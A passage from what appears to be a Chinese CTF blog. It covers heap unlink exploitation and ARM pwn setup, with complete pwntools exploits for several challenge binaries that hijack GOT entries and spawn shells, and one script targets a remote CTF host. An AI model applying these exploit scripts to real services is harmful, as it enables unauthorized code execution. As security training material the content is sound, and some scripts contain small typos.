参考链接：https://www.anquanke.com/post/id/85127https://bbs.pediy.com/thread-251195.htmhttps://www.cnblogs.com/shangye/p/6268981.htmlhttps://www.jianshu.com/p/4b0a73f321f9https://xz.aliyun.com/t/2411]]></content>
  </entry>
  <entry>
    <title><![CDATA[unlink]]></title>
    <url>%2F2020%2F02%2F18%2Funlink%2F</url>
    <content type="text"><![CDATA[把ctf wiki里的unlink题简单的做了一下先简单的记录一下，以后吃透了再回来好好的填填坑 理解了一下unlink的操作就是构造一个chunk，例如 123456789101112131415160x1302000: 0x0000000000000000 0x00000000000000510x1302010: 0x0000000000000000 0x0000000000000040 #fack_chunk（构造成一个free掉的样子） 0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x110x1302020: 0x00000000006030d0 0x00000000006030d80x1302030: 0x6161616161616161 0x61616161616161610x1302040: 0x6161616161616161 0x61616161616161610x1302050: 0x0000000000000040 0x00000000000000a0 #p位改成0，free下一个chunk之后会与上一个chunk合并0x1302060: 0x654420746f626f52 0x00000000006c69760x1302070: 0x0000000000000000 0x00000000000000000x1302080: 0x0000000000000000 0x00000000000000000x1302090: 0x0000000000000000 0x00000000000000000x13020a0: 0x0000000000000000 0x00000000000000000x13020b0: 0x0000000000000000 0x00000000000000000x13020c0: 0x0000000000000000 0x00000000000000000x13020d0: 0x0000000000000000 0x00000000000000000x13020e0: 0x0000000000000000 0x00000000000000000x13020f0: 0x0000000000000000 0x0000000000020f11 Hitcon-training lab11 bambooboxunlink的很重要一个条件就是已知存储各个堆块地址的位置。 unlink操作： 123456789101112131415161718add(0x80,'aaaaaa') #chunk0add(0x80,'bbbbbb') #chunk1add(0x80,'cccccc') #chunk2target = 0x6020c8fd = target - 0x18bk = target - 0x10# fack chunk（构造成被free掉的样子pay = p64(0) + p64(0x81) pay += p64(fd)pay += p64(bk)pay += 'a'*0x60pay += p64(0x80)+p64(0x90)# gdb.attach(r)modify(0,0x90,pay)remove(1) #free chunk1，使chunk1往前合并,触发unlink 则chunk0就变成了发错fack_chunk里面的fd和bk，所指向的target改target的内容为我们想覆写的一个got表地址，这样show的时候也可以leak出libc来 1234567891011payload = '\x00'*0x10+ p64(0x80) + p64(0x602068) #把atoi的got表地址覆写成chunk0里面modify(0,0x60,payload)show()r.recvuntil("0 : ") atoi_addr = u64(r.recv(6).ljust(8,"\x00")) print hex(atio_addr)libc_base=atoi_addr-0x36E80print hex(libc_base)one_gadget = libc_base + 0xf02a4modify(0,0x8,p64(one_gadget)) #把atoi got表里的内容改为one gadget 完整exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")r=process('./bamboobox')elf=ELF('./bamboobox')# r = remote(host,port)def add(length,name): r.recvuntil(":") r.sendline("2") r.recvuntil("Please enter the length of item name:") r.sendline(str(length)) r.recvuntil(":") r.sendline(name)def modify(idx,length,name): r.recvuntil("Your choice:") r.sendline("3") r.recvuntil(":") r.sendline(str(idx)) r.recvuntil(":") r.sendline(str(length)) r.recvuntil(":") r.sendline(name)def remove(idx): r.recvuntil(":") r.sendline("4") r.recvuntil("Please enter the index of item:") r.sendline(str(idx))def show(): r.recvuntil(":") r.sendline("1") add(0x80,'aaaaaa')add(0x80,'bbbbbb')add(0x80,'cccccc')target = 0x6020c8fd = target - 0x18bk = target - 0x10# pay ='a'*0x10pay = p64(0) + p64(0x81) pay += p64(fd)pay += p64(bk)pay += 'a'*0x60pay += p64(0x80)+p64(0x90)# gdb.attach(r)modify(0,0x90,pay)remove(1)payload = '\x00'*0x10+ p64(0x80) + p64(0x602068)modify(0,0x60,payload)show()# r.recv()r.recvuntil("0 : ")atoi_addr = u64(r.recv(6).ljust(8,"\x00"))print hex(atoi_addr)libc_base=atio_addr-0x36E80print hex(libc_base)one_gadget = libc_base + 0xf02a4system = libc_base + 0x45390# r.recv()# modify(0,0x8,p64(system))modify(0,0x8,p64(one_gadget))# r.recvuntil(":")# r.sendline("$0")r.interactive() 2016 ZCTF note2unlink来说就是构造一个fack_chunk（为free完的样子）如果可以overlap的话，直接写在下一个chunk的top，size的p位为0，如果不可以的overlap的话，就是这题一样，利用两个chunk来构造一个fack_chunk，free掉fack_chunk后面那个chunk，使之合并，触发unlink。 和lab11差不多的方法 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")p = process('./note2')elf = ELF('./note2')def add(length, content): p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('(less than 128)') p.sendline(str(length)) p.recvuntil('content:') p.sendline(content)def show(id): p.recvuntil('option---&gt;&gt;') p.sendline('2') p.recvuntil('note:') p.sendline(str(id))def edit(id, choice, s): p.recvuntil('option---&gt;&gt;') p.sendline('3') p.recvuntil('note:') p.sendline(str(id)) p.recvuntil('2.append]') p.sendline(str(choice)) p.sendline(s)def free(id): p.recvuntil('option---&gt;&gt;') p.sendline('4') p.recvuntil('note:') p.sendline(str(id))p.recvuntil("Input your name:\n")p.sendline("aaaa")p.recvuntil("Input your address:\n")p.sendline("bbbb")target = 0x602120#prtfd = target - 0x18bk = target -0x10payload = p64(0)+p64(0x60)payload += p64(fd)+p64(bk)payload += 'a'*0x20add(0x40,payload)#0add(0,'bbbb')#1add(0x80,'cccc')#2free(1)gdb.attach(p)payload1='a'*0x10payload1+=p64(0x60)+p64(0x90)add(0,payload1)#1free(2)atoi=elf.got['atoi']payload2 ='a'*0x18+p64(atoi)#prt-0x18 startedit(0,1,payload2)#0show(0)p.recvuntil('is ')atoi_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\00"))offset_addr=atoi_addr-libc.sym['atoi']print hex(offset_addr)print hex(atoi_addr)one_gadget=offset_addr+0xf1147edit(0,1,p64(one_gadget))p.sendline('\n')p.interactive() 2016 zctf note3和note2比，它就少了个show，但是我们可以利用puts函数来leak就有就往fack_chunk里面写入free和puts两个函数的got值的操作，leak puts exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'sh=process('./note3')# sh=remote('127.0.0.1',9999)elf=ELF('./note3')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(size,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('1') sh.recvuntil('1024)\n') sh.sendline(str(size)) sh.recvuntil('content:\n') sh.sendline(content)def edit(index,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('3') sh.recvuntil('note:\n') sh.sendline(str(index)) sh.recvuntil('ent:\n') sh.sendline(content)def delete(index): sh.recvuntil('&gt;&gt;\n') sh.sendline('4') sh.recvuntil('note:\n') sh.sendline(str(index))target = 0x6020c8#prtfd = target - 0x18bk = target -0x10payload = p64(0)+p64(0x60)payload += p64(fd)+p64(bk)payload += 'a'*0x20add(0x40,payload)#0add(0,'bbbb')#1add(0x80,'cccc')#2delete(1)# gdb.attach(sh)payload1='a'*0x10payload1+=p64(0x60)+p64(0x90)add(0,payload1)#1delete(2)free=elf.got['free']put_gots = elf.got['puts']payload2 ='a'*0x18 + p64(free) + p64(put_gots)#prt-0x18 startedit(0,payload2)#0puts_plt = elf.sym['puts']edit(0,p64(puts_plt)[:-1]) # 解决了只能包含“\n”只能发送八个字节的问题delete(1)puts_addr = u64(sh.recvuntil("\nDelete success\n",drop=True).ljust(8,"\00"))print hex(puts_addr)libc_base = puts_addr - libc.sym['puts']print hex(libc_base)one_gadget = libc_base + 0xf1147edit(0,p64(one_gadget)[:-1])gdb.attach(sh)# add(0x88,'aaaa')delete(0)sh.interactive() 另一种方法，是用了edit里面id的整数溢出，用复数使chunk可以直接overlap然后改free的got为system（这个是把chunk0覆写成free got的地址，再edit一次0，就可以写system写进got表），再把binsh的地址写在原本是chunk0地址的地方，free的时候，拿chunk0当参数就可以实现system(‘/bin/sh’)（one_gadget其实更方便一点） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'sh=process('./note3')# sh=remote('127.0.0.1',9999)elf=ELF('./note3')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') def newnote(size,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('1') sh.recvuntil('1024)\n') sh.sendline(str(size)) sh.recvuntil('content:\n') sh.sendline(content)def editnote(index,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('3') sh.recvuntil('note:\n') sh.sendline(str(index)) sh.recvuntil('ent:\n') sh.sendline(content)def delnote(index): sh.recvuntil('&gt;&gt;\n') sh.sendline('4') sh.recvuntil('note:\n') sh.sendline(str(index))newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'/bin/sh')inter=-9223372036854775808payload=p64(0)payload+=p64(0x81)payload+=p64(0x6020e0-0x18)payload+=p64(0x6020e0-0x10)payload=payload.ljust(0x80,'a')payload+=p64(0x80)payload+=p64(0x90)gdb.attach(sh)editnote(3,'a')editnote(inter,payload) #editnote(-1,payload) 此時size為note6地址 改的是chunk3delnote(4)free_got=elf.got['free']puts_plt=elf.plt['puts']atol_got=elf.got['atol']puts_got=elf.got['puts']editnote(3,p64(free_got)+p64(puts_got))editnote(0,p64(puts_plt)[:-1])delnote(1)puts_adr=sh.recvuntil('\nDelete success\n',drop=True).ljust(8,'\x00')puts_adr=u64(puts_adr)print 'puts_adr: '+hex(puts_adr) libc_base=puts_adr-libc.symbols['puts']sys_adr=libc_base+libc.symbols['system']binsh_adr=libc_base+libc.search('/bin/sh').next()print 'libc_base: '+hex(libc_base)print 'sys_adr: '+hex(sys_adr)print 'binsh_adr: '+hex(binsh_adr)editnote(0,p64(sys_adr)[:-1])editnote(3,p64(binsh_adr)[:-1]) #作为chunk0,即free的参数delnote(0)sh.interactive() 学到的新技能 1p64(puts_plt)[:-1] # 解决了只能包含“\n”只能发送八个字节的问题 2014 hitcon stkof这题我一直绕的点在，target为什么要是chunk0+0x10，即chunk2的位置在测试中，我们可以发现其实chunk1和chunk2之间是隔了0x400的，但chunk2和chunk3是相邻的我们需要在chunk2中操作unlink，所以我们需要是 chunk2 --&gt;fack_chunk(chunk2-0x18),所以target改为chunk2地址所在的位置（在何位置构造，指针则指向哪里） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!usr/bin/env python# -*- coding:utf-8 -*- from pwn import* context.log_level ='DEBUG' sh = process("./stkof")elf = ELF("./stkof")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(size): sh.sendline("1") sh.sendline(str(size)) sh.recvuntil("OK\n") def delete(idx): sh.sendline("3") sh.sendline(str(idx)) def edit(idx,strings): sh.sendline("2") sh.sendline(str(idx)) sh.sendline(str(len(strings))) sh.send(strings) sh.recvuntil("OK\n")free_got = elf.got['free']puts_got = elf.got['puts']puts_plt = elf.sym['puts']add(0x80) #1add(0x80) #2add(0x80) #3target = 0x602140 + 0x10fd = target - 0x18bk = target - 0x10payload = p64(0)+p64(0x81)payload += p64(fd) +p64(bk)payload += 'a'*0x60payload += p64(0x80)+p64(0x90)gdb.attach(sh)edit(2,payload) #在chunk2的地方修改，则要使fack指向全局指针存放chunk2处的地址，而非chunk0delete(3)sh.recvuntil("OK")payload = 'a'*0x8 + p64(free_got) + p64(puts_got)edit(2,payload)edit(0,p64(puts_plt))delete(1)puts_addr = u64(sh.recvuntil('\nOK\n', drop=True).ljust(8, '\x00'))libc_base = puts_addr - libc.sym['puts']print hex(puts_addr)print hex(libc_base)onegadget = libc_base + 0xf1147edit(0,p64(onegadget))delete(0)sh.interactive() 2017 wheelofrobots这道题太混乱了，好复杂的一个程序啊，我看了老半天才稍微看懂这个程序是干嘛的 洞的话第一个应该是add里面choose之后输入那里 off by one 123456789101112131415161718192021222324252627sub_400D83("Which robot do you want to add to the wheel?");printf("Your choice :");memset(&amp;unk_603110, 0, 4uLL);v10 = sub_400A36(&amp;unk_603110, 5LL); //可以多一个字节溢出，覆盖的地址在0x603114的内容而0x603114刚好是存放第二个robot状态的地址 case 2: if ( !dword_603114 ) &#123; printf("Increase Bender's intelligence: ", 5LL); memset(&amp;s, 0, 5uLL); v8 = sub_400A36(&amp;s, 5LL); if ( v8 &gt; 4 ) &#123; puts("Sorry impossible to make bender as smart!"); v8 = 2; &#125; qword_6030F0 = calloc(1uLL, 20 * v8); qword_603138 = v8; dword_603114 = 1; v1 = qword_6030F0; *(_DWORD *)qword_6030F0 = 'dneB'; v1[2] = 're'; *((_BYTE *)v1 + 6) = 0; ++qword_603130; &#125; break; 我们可以通过更改bender的状态做到不add直接change然后我们可以发现这几个robots之间错综复杂的关系，就可以构造face_chunk,实现unlink 12345678910111213141516171819202122case 1u: result = (unsigned int)dword_603120; if ( dword_603120 ) &#123; puts("Robot's name: "); result = read(0, buf, 0x14uLL); &#125; break; .bss:00000000006030F8 ; void *buf.bss:00000000006030F8 buf dq ? ; DATA XREF: sub_400DF8+A6↑w.bss:00000000006030F8 ; sub_400DF8+B7↑r ... case 6u: result = (unsigned int)dword_60311C; if ( dword_60311C ) &#123; puts("Robot's name: "); result = read(0, qword_6030E8, 20 * qword_603148); &#125; break; 我们知道如果在tinny处改size就可以覆盖destruction的内容，构造unlink，先在bss段构造fack_chunk，使原本指向tinny，即chunk1的指针，指向0x603148处，之后对chunk1的所有操作都在这个地址处 1234567891011pwndbg&gt; x/40gx 0x6030e00x6030e0: 0x0000000000000000 0x00000000000000000x6030f0: 0x0000000001021010 0x0000000000603148 -&gt;tinny point to 0x6031480x603100: 0x0000000001021030 0x00000000000000000x603110: 0x0000000100000a31 0x00000000000000000x603120: 0x0000000100000001 0x00000000000000000x603130: 0x0000000000000003 0x00000000000000010x603140: 0x0000000000000020 -&gt; fack_chunk 0x695420796e6e69540x603150: 0x000000000000006d 0x00000000000000000x603160: 0x0000000000000000 0x00000000000000000x603170: 0x0000000000000000 0x0000000000000000 利用chunk1和chunk6的关系，在chunk6上构造unlink，使unlink到0x6030e8-0x18处，就可以覆写该存放chunk地址为自己想改写的东西。 wiki具体exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = "./wheelofrobots"robots = ELF('./wheelofrobots')if args['REMOTE']: p = remote('127.0.0.1', 7777)else: p = process("./wheelofrobots")log.info('PID: ' + str(proc.pidof(p)[0]))libc = ELF('./libc.so.6')context.log_level = 'debug'def offset_bin_main_arena(idx): word_bytes = context.word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offsetdef add(idx, size=0): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.sendline(str(idx)) if idx == 2: p.recvuntil("Increase Bender's intelligence: ") p.sendline(str(size)) elif idx == 3: p.recvuntil("Increase Robot Devil's cruelty: ") p.sendline(str(size)) elif idx == 6: p.recvuntil("Increase Destructor's powerful: ") p.sendline(str(size))def remove(idx): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Your choice :') p.sendline(str(idx))def change(idx, name): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Your choice :') p.sendline(str(idx)) p.recvuntil("Robot's name: \n") p.send(name)def start_robot(): p.recvuntil('Your choice :') p.sendline('4')def overflow_benderinuse(inuse): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.send('9999' + inuse)def write(where, what): change(1, p64(where)) change(6, p64(what))def exp(): print "step 1" # add a fastbin chunk 0x20 and free it # so it is in fastbin, idx2-&gt;NULL add(2, 1) # idx2 remove(2) gdb.attach(p) # overflow bender inuse with 1 overflow_benderinuse('\x01') # change bender's fd to 0x603138, point to bender's size # now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL change(2, p64(0x603138)) # in order add bender again overflow_benderinuse('\x00') # add bender again, fastbin 0x603138-&gt;NULL add(2, 1) # in order to malloc chunk at 0x603138 # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # it is at Robot Devil add(3, 0x20) #构造个size，使add tinny的时候指向0x603148，同时把它写进0x3060f8 # trigger malloc, set tinny point to 0x603148 add(1) # wheels must &lt;= 3 remove(2) remove(3) print 'step 2' # alloc Destructor size 60-&gt;0x50, chunk content 0x40 add(6, 3) # alloc devil, size=20*7=140, bigger than fastbin add(3, 7) # edit destructor's size to 1000 by tinny change(1, p64(1000)) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(fakechunk_addr - 0x10) + p64(0x20) fakechunk = fakechunk.ljust(0x40, 'a') fakechunk += p64(0x40) + p64(0xa0) change(6, fakechunk) #写在heap里 # trigger unlink remove(3) print 'step 3' # make 0x6030F8 point to 0x6030E8 payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8) change(6, payload) print 'step 4' # make exit just as return write(robots.got['exit'], 0x401954) print 'step 5' # set wheel cnt =3, 0x603130 in order to start robot write(0x603130, 3) # set destructor point to puts@got change(1, p64(robots.got['puts'])) start_robot() #start chunk1，即puts p.recvuntil('New hands great!! Thx ') puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] log.success('libc base: ' + hex(libc_base)) system_addr = libc_base + libc.symbols['system'] binsh_addr = libc_base + next(libc.search('/bin/sh')) # make free-&gt;system write(robots.got['free'], system_addr) # make destructor point to /bin/sh addr write(0x6030E8, binsh_addr) # get shell remove(6) p.interactive() passif __name__ == "__main__": exp() emmm这种方法在start robots那里我就很懵，简便一点的话就换一种方法来leak，直接覆写chunk1和chunk2，通过改free的got表来实现exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#!usr/bin/env python# -*- coding:utf-8 -*- from pwn import* context.log_level ='DEBUG'elf = ELF('./wheelofrobots')p = process("./wheelofrobots")libc = ELF('./libc.so.6')def add(idx, size=0): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.sendline(str(idx)) if idx == 2: p.recvuntil("Increase Bender's intelligence: ") p.sendline(str(size)) elif idx == 3: p.recvuntil("Increase Robot Devil's cruelty: ") p.sendline(str(size)) elif idx == 6: p.recvuntil("Increase Destructor's powerful: ") p.sendline(str(size))def remove(idx): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Your choice :') p.sendline(str(idx))def change(idx, name): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Your choice :') p.sendline(str(idx)) p.recvuntil("Robot's name: \n") p.send(name)def start_robot(): p.recvuntil('Your choice :') p.sendline('4')def overflow_benderinuse(inuse): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.send('9999' + inuse)def write(where, what): change(1, p64(where)) change(6, p64(what))add(2,1)remove(2)overflow_benderinuse('\x01')change(2,p64(0x603138))overflow_benderinuse('\x00')add(2,1)add(3,0x20)add(1)remove(2)remove(3)add(6,3) #60-&gt;0x40add(3,7) #140-&gt;0x90change(1,p64(1000)) #改大小方便填写payloadtarget = 0x6030e8fd = target-0x18bk = target-0x10pay = p64(0)+p64(0x40)+p64(fd) + p64(bk) +'a'*0x20+p64(0x40)+p64(0xa0)change(6,pay)remove(3) #unlink# gdb.attach(p)add(2,1)pay = 'a'*0x18 +p64(elf.got['free'])+p64(elf.got['puts'])change(6,pay)pay = p64(elf.plt['puts'])change(6,pay)remove(2)puts_addr = u64(p.recv(6).ljust(8,'\x00'))print hex(puts_addr)libc_base = puts_addr - libc.sym['puts']print hex(libc_base)system = libc_base + libc.sym['system']change(6,p64(system))change(1,"/bin/sh")p.interactive() 参考链接：https://www.jianshu.com/p/b5ce1e4aee6ahttps://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/]]></content>
  </entry>
  <entry>
    <title><![CDATA[arm的环境搭建+简单的例题]]></title>
    <url>%2F2020%2F02%2F07%2Farm%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E9%A2%98%2F</url>
    <content type="text"><![CDATA[关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看 arm环境搭建1234567891011121314#安装qemuapt-get install qemu#更新一下sudo apt-get update#安装32位的依赖库sudo apt-get install -y gcc-arm-linux-gnueabi#运行32位的动态链接程序方法qemu-arm -L /usr/arm-linux-gnueabi ./文件#安装64位的依赖库sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu#运行64位的动态链接程序方法qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件#安装gdb调试工具sudo apt-get install git gdb gdb-multiarch 32位的调试步骤：1234567891011#运行32位的动态链接程序方法qemu-arm -L /usr/arm-linux-gnueabi ./文件#32位程序下断调试步骤1： qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./文件(窗口1)2： qemu-arm-static -g 1234 ./文件（窗口1）gdb-multiarch ./文件(窗口2)pwndbg&gt; target remote :1234pwndbg&gt; b *0x8bb0pwndbg&gt; c 64位的调试步骤：12345678#运行64位的动态链接程序方法qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件#64位程序下断调试步骤qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./文件(窗口1)gdb-multiarch ./文件(窗口2)pwndbg&gt; target remote :1234pwndbg&gt; b *0x8bb0pwndbg&gt; c 起qemu的那个虚拟机（上面那些命令行好像更方便一点，这个的话可能每次打题都要起一次） 1sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic,macaddr=52:54:00:12:34:56 -net tap -nographic 架构下的寄存器64位的寄存器123456789x0~x7：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在x0中。x8：用于保存子程序的返回地址，使用时不需要保存。x9~x15：临时寄存器，也叫可变寄存器，子程序使用时不需要保存。x16~x17：子程序内部调用寄存器（IPx），使用时不需要保存，尽量不要使用。x18：平台寄存器，它的使用与平台相关，尽量不要使用。x19~x28：临时寄存器，子程序使用时必须保存。x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。x30：链接寄存器（LR），用于保存子程序的返回地址。x31：堆栈指针寄存器（SP），用于指向每个函数的栈顶。 32位的寄存器123456r0-r3: 用于函数调用入参，32位最多支持4个入参，当多于4个入参是将通过压栈方式进行传递。栈的方式为先进后出，估参数大于4个时 入栈顺序与参数顺序正好相反，子程序返回前无需回复R0~R3的值,32位的返回结果保存在r0中。r4-r11: 用于保存局部变量。函数进入后首先第一件事就是将R4~R11入栈保存(看局部变量用了多少个，不一定所有都需要入栈)，然后才能用于本函数使用，本函数使用完之后，要将之前栈保存的数据恢复到R4~R11中r7: 系统调用时，存放系统调用号，有时也用于作为FP使用。FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯。r13: SP，即栈指针寄存器，主要用于指向当前程序栈顶，配合指令pop/push等。r14: LR，即链接寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行。r15: PC，即程序寄存器，主要用于存放CPU取指的地址。是取值地址，不是当前运行地址。 arm的简单例题32位简单的armtypo就是道很简单的ret2text用命令行先连上qume和gdb，让它跑起来 然后就可以调了我们在gdb里生成字符串，自己输的话，计算长度可能会出bug调出长度之后就去找程序有没有system(‘/bin/sh’)这个东西去了函数符号表，我不会那个rizzo的恢复，所以直接找字符’/bin/sh’ 会发现它在一个函数里这个长得就很像execve，f5进去看一下 然后这个名字就很像了，再加上系统调用号也出来了（经大佬指点才知道arm32中系统调用号是在r7里的）点开汇编，发现它确实是然后我们就用syscall来做这题吧syscall要用的话，肯定是要r1、 r2的参数都得为null的所以我们去找gadgetr0的就只有一个，然后还有相关的r1和r7都能对应找到唯独发现没有pop r2的gadget，所以我们考虑一下xor或者是mov（xor好像在arm里没有）这里面对r2有赋值为零的gadget，我们可以用一波，但事实它还自带三个pop，为了堆栈平衡，我们就还得填充三个0差不多就可以写exp了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &quot;debug&quot;if sys.argv[1] == &quot;l&quot;: io = process(&quot;./typo&quot;, timeout = 2)elif sys.argv[1] == &quot;d&quot;: io = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])else: io = remote(&quot;pwn2.jarvisoj.com&quot;, 9888, timeout = 2)mov_r2 = 0x0004df00 #mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;syscall = 0x0002165Cpop_r3_r7 =0x0000a958pop_r0_r4 = 0x00020904 #pop &#123;r0, r4, pc&#125;pop_r1 = 0x00068becpop_r7 = 0x00014068#0x00008160binsh = 0x0006c384payload = &apos;a&apos;*112 payload += p32(mov_r2)payload += p32(0)+p32(0)+p32(0)payload += p32(pop_r0_r4)payload += p32(binsh)+p32(0)payload += p32(pop_r7)+p32(0xb)payload += p32(pop_r1)+p32(0)payload += p32(syscall)# r0-&gt;binsh r1,r2-&gt;0 arm的系统调用号存在r7# io.sendline(&apos;\n&apos;)io.sendlineafter(&quot;if you want to quit\n&quot;, &apos;\n&apos;)io.sendline(payload)io.interactive() 然后我碰到一个很难受的bug，本地加了context.log_level = “debug”是能跑通的，但是不加就不行了，为啥呢，害，到时候再探究探究 melong（arm32位）这题是个 简单的栈题，我被难倒的地方是offset到底是什么这题的栈溢出存在于write那个函数里的read用-1绕过len，使我们可以输入很多的东西，可以构造rop链write函数里面长这样，我们到出去看a2是什么发现是v4，去找他的偏移，发现是0x54，就一般在我的印象里，偏移应该是ebp+0x54，所以应该再加一个4的，但是看了很多exp都是用的0x54 发现我们需要覆盖到dd4的地方 r11（d14-&gt;exid即下一个函数的地址存放处）而开始覆盖是在d80，offset为84 即 0x54（但是我并没有在ida里找到那段代码）这个是我写入100个字符之后，触发exit之后报错之后，计算出来的 偏移，就是0x54，这题也确实比较独特，ida里的偏移果然不一定是对的 然后用put的方法leak的话呢，本来以为会比较快捷方便一点，但是这里最想不到的是，进入了puts函数之后，结尾时会否存在pop，pc又在哪里赋值，在傻傻地用正常栈的方法试了一遍发现不行，选择跟进去看看puts里面的玄机 发现在末尾它有一个pop所以要想回到主函数还要填充些值进寄存器里 exp大概就如下了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level =&apos;DEBUG&apos;import syscontext.binary = &quot;./melong&quot;if sys.argv[1] == &quot;r&quot;: p = remote(&quot;localhost&quot;, 9999)elif sys.argv[1] == &quot;l&quot;: p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])else: p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])elf = ELF(&quot;./melong&quot;, checksec = False)libc = ELF(&quot;./lib/libc.so.6&quot;, checksec = False)def check(height,weight): p.sendlineafter(&quot;number:&quot;,&quot;1&quot;) p.sendlineafter(&quot;height(meters) :&quot;,str(height)) p.sendlineafter(&quot;weight(kilograms) :&quot;,str(weight))def exercise(): p.sendlineafter(&quot;number:&quot;,&quot;2&quot;)def register(num): p.sendlineafter(&quot;number:&quot;,&quot;3&quot;) p.sendlineafter(&quot;training?&quot;,str(num))def write(content): p.sendlineafter(&quot;number:&quot;,&quot;4&quot;) # p.sendlineafter(&apos;\n&apos;,content) p.send(content)def out(): p.sendlineafter(&quot;number:&quot;,&quot;6&quot;)pop = 0x00011bbccheck(1.58,49.8)register(-1)payload = &apos;a&apos;*0x54+p32(pop) + p32(elf.got[&apos;puts&apos;]) + p32(elf.sym[&apos;puts&apos;]) +p32(0)*7+p32(elf.sym[&apos;main&apos;])write(payload)out()p.recvuntil(&quot;See you again :)\n&quot;)put_addr = u32(p.recvn(4))print hex(put_addr)libc.address = put_addr - libc.sym[&apos;puts&apos;]print hex(libc.address)check(1.58,49.8)register(-1)pay = &quot;a&quot;*0x54 + p32(pop) + p32(next(libc.search(&quot;/bin/sh&quot;))) + p32(libc.sym[&apos;system&apos;])write(pay)out()p.interactive() 64位简单题2018 上海大学生网络安全大赛 babyarm开了nx 一眼看到了mprotect函数，一般呢有它就是改权限然后写shellcode了，上一次用这个好像是level5，emmmm碰巧这题好像也可以用这个方法做，听说是有三个参数的函数要调用和写参的话就用csu这种方法比较简单 